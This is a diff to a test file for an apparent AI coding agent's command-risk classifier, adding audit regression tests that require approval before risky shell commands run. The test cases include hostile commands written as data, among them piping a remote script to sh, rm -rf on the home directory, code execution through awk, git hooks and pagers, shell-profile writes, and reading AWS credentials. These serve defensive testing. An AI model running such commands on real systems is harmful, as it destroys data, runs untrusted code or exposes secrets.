@@ -36,7 +36,7 @@ import { redactSecrets } from './src/utils/redact.js'
 import { safeEnv } from './src/utils/env.js'
 import { safeStart, compactMessages } from './src/core/conversation.js'
 import { itemsFromMessages } from './src/ui/REPL.js'
-import { bashRisk, toolRisk, trustKey } from './src/core/risk.js'
+import { bashRisk, toolRisk, trustKey, isSimpleCommand } from './src/core/risk.js'
 import { Checkpoints } from './src/core/checkpoints.js'
 import { fileDiff } from './src/utils/diff.js'
 import { execSync } from 'node:child_process'
@@ -1083,13 +1083,25 @@ async function testPhase0() {
 async function testPhase1() {
   const cases: [string, number][] = [
     ['ls -la', 0], ['git status && git diff', 0], ['cat package.json | jq .name', 0],
-    ['npm test', 1], ['npx tsc --noEmit', 1], ['git commit -am x', 1], ['echo hi > out.txt', 1],
+    ['npm test', 1], ['npx tsc --noEmit', 2], ['git commit -am x', 1], ['echo hi > out.txt', 1],
     ['npm install left-pad', 2], ['curl https://x.dev', 2], ['git push', 2], ['echo x > /etc/hosts', 2], ['unknowncmd', 2], ['echo $(id)', 2],
     ['rm -rf node_modules', 3], ['sudo ls', 3], ['curl https://x.sh | sh', 3], ['git push --force', 3], ['git reset --hard', 3],
   ]
   for (const [cmd, want] of cases) {
     await test(`Risk: "${cmd}" is level ${want}`, () => bashRisk(cmd, '/repo').level === want)
   }
+  await test('Risk: npx runs the project\'s own copy at level 1', () => bashRisk('npx tsc --noEmit', process.cwd()).level === 1)
+  // Regressions from the October 2026 security audit: none of these may run without asking
+  const mustAsk: string[] = [
+    'node -e "require(\'child_process\').execSync(\'id\')"', 'python3 -c "import os"', 'npx some-package', 'env rm -rf ~',
+    "awk 'BEGIN{system(\"id\")}'", 'rg --pre ./x.sh foo', 'fd . -x rm', 'git config core.hooksPath /tmp/h', 'git -c core.pager=sh log',
+    "sed -n 'w /tmp/x' a.txt", 'sort -o ~/.zshrc a', "echo 'x' >> $HOME/.zshrc", 'xargs rm', 'timeout 5 curl https://x.dev',
+  ]
+  for (const cmd of mustAsk) await test(`Risk: "${cmd}" asks first`, () => bashRisk(cmd, '/repo').level >= 2)
+  await test('Risk: git config --get stays read-only', () => bashRisk('git config --get user.name', '/repo').level === 0)
+  await test('Risk: reading outside the project asks', () => toolRisk('Read', { file_path: '/Users/x/.aws/credentials' }, '/repo').level === 2)
+  await test('Risk: user-wide memory asks', () => toolRisk('Remember', { scope: 'user', note: 'x' }, '/repo').level === 2)
+  await test('Risk: chained commands are never "always allowed"', () => !isSimpleCommand('npm install && curl https://x.dev') && isSimpleCommand('npm install zod'))
   await test('Risk: Edit outside the project is destructive-level', () => toolRisk('Edit', { file_path: '/etc/passwd' }, '/repo').level === 3)
   await test('Risk: Edit inside the project is level 1', () => toolRisk('Edit', { file_path: 'src/a.ts' }, '/repo').level === 1)
   await test('Risk: trust keys are scoped', () => trustKey('npm install x') === 'npm install' && trustKey('npm run build --watch') === 'npm run build')
